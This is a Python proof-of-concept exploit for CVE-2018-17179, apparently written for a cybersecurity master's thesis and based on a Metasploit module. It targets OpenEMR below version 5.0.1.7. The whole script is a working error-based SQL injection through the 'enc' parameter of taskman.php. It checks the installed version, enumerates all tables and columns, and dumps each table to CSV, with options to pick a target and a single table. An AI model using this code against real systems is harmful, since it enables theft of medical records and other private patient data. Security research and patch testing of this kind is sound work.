# TFM: 
# Center: IMF Master Cybersecurity Deloitte Online 
# Author: M3str3 <namestre3@protonmail.com>
# CVE-2018-17179
# CVE Details: https://www.cvedetails.com/cve/CVE-2018-17179/
# Based on this Metasploit module / exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb

from bs4 import BeautifulSoup
from datetime import datetime

import requests
import csv
import re
import os
import argparse

parser = argparse.ArgumentParser(description="PoC 2018-17179 by M3str3<namestre3@protonmail.com>")
parser.add_argument('-t','--target',help="Target IP or domain", required=True)
parser.add_argument('--ssl',action="store_true",help="Use http or https protocol")
parser.add_argument('--debug', action="store_true",help="Enable debug mode")
parser.add_argument('--table', help="Export specific table")
args = parser.parse_args()

protocol = "https" if args.ssl else "http"
base_url = f'{protocol}://{args.target}'

def send_request(url: str, params: dict = None) -> requests.Response:
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def get_openemr_version() -> str:
    url = base_url + '/admin.php'
    response = send_request(url)
    if response:
        soup = BeautifulSoup(response.text, 'lxml')
        version_text = soup.select('tr')[1].select('td')[3].text.strip()
        return version_text.split(' ')[0]  
    return ''

def check_vulnerability() -> bool:
    print("[*] Trying to detect installed version")
    version = get_openemr_version()
    if not version:
        return False
    print(f"[*] Version {version} detected")
    return version < '5.0.1.7'

def get_response(payload: str) -> requests.Response:
    if args.debug:
        print("---------------------")
        print(f"[$] Payload: {payload}")
    params = {
        'action': 'make_task',
        'from_id': '1',
        'to_id': '1',
        'pid': '1',
        'doc_type': '1',
        'doc_id': '1',
        'enc': f"1' and updatexml(1,concat(0x7e, ({payload})),0) or '"
    }
    url = base_url + '/interface/forms/eye_mag/taskman.php'
    response = send_request(url, params)
    if args.debug:
        if response is not None:
            print(f"[*] Response: {response.text}")
        else:
            print("[!] Failed response")
        print("---------------------")
    return response

def save_csv(data: list, table: str) -> None:
    safe_table = ''.join([c if c.isalnum() or c in '._' else '_' for c in table])
    filename = f"data/{safe_table}.csv"
    with open(filename, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerows(data)
    if args.debug:
        print(f"[*] Saved {table} to {filename}")

def get_table_columns(table_name: str) -> list:
    columns = []
    offset = 0
    while True:
        payload = f"select column_name from information_schema.columns where table_name='{table_name}' limit 1 offset {offset}"
        res = get_response(payload)
        if not res:
            break
        match = re.search(r"XPATH syntax error: '~(.*?)'</font>", res.text)
        if not match:
            break

        column_name = match.group(1)
        columns.append(column_name)
        offset += 1
    return columns

def dump_table(table_name: str, columns: list) -> list:
    table_data = [columns]
    row_offset = 0
    while True:
        row = []
        for column in columns:
            payload = f"select {column} from {table_name} limit 1 offset {row_offset}"
            res = get_response(payload)
            if not res:
                break
            match = re.search(r"XPATH syntax error: '~(.*?)'</font>", res.text)
            if not match:
                if column == columns[0]:
                    # If the first column is empty do not continue
                    break
                if args.debug:
                    print("No match")
                row.append(None)
                continue                       
            row.append(match.group(1))
        
        if not any(row):
            break
        table_data.append(row)
        row_offset += 1
    return table_data

def dump_entire_database() -> None:
    print("[*] Enumerating tables, this may take a moment...")
    tables = []
    offset = 0
    while True:
        payload = f"select table_name from information_schema.tables where table_schema=database() limit 1 offset {offset}"
        res = get_response(payload)
        if not res:
            print("[!] The target does not seem vulnerable")
            return
        match = re.search(r"XPATH syntax error: '~(.*?)'</font>", res.text)
        if not match:
            break

        table_name = match.group(1)
        tables.append(table_name)
        offset += 1
    
    num_tables = len(tables)
    print(f"[*] Identified {num_tables} tables.")
    
    skiptables = ['form_taskman', 'log', 'log_comment_encrypt', 'lang_definitions']
    
    for i, table in enumerate(tables):
        if table in skiptables:
            print(f"[!] Skipping table ({i + 1}/{num_tables}): {table}")
        else:
            columns = get_table_columns(table)
            if args.debug:  
                print(f"[DEBUG] Dumping table ({i + 1}/{num_tables}): {table} ({', '.join(columns)})")
            else:
                print(f"\r[*] {i+1}/{len(tables)} {table}", end="                    ")
            table_data = dump_table(table, columns)
        
            save_csv(table_data, table)

if __name__ == "__main__":
    print("="*60)
    print(" " * 10 + "Proof of Concept - CVE-2018-17179")
    print(" " * 10 + "IMF Master Cybersecurity Deloitte Online")
    print(" " * 10 + "Author: M3str3 <namestre3@protonmail.com>")
    print("="*60)

    startt = datetime.now()
    if check_vulnerability():
        if not os.path.exists('data'):
            os.makedirs('data')
            
        if args.table:
            columns = get_table_columns(args.table)
            table_data = dump_table(args.table, columns)
            save_csv(table_data, args.table)
            print(f"[*] data/{args.table}.csv saved!!")
        else:
            print(f"\033[91m[WARNING] Dumping the entire database......better go for a coffee...\033[39m")
            dump_entire_database()
    
    endt = datetime.now()
    lapse = endt - startt
    
    print(f"[*] Time lapsed: {lapse.seconds}s")
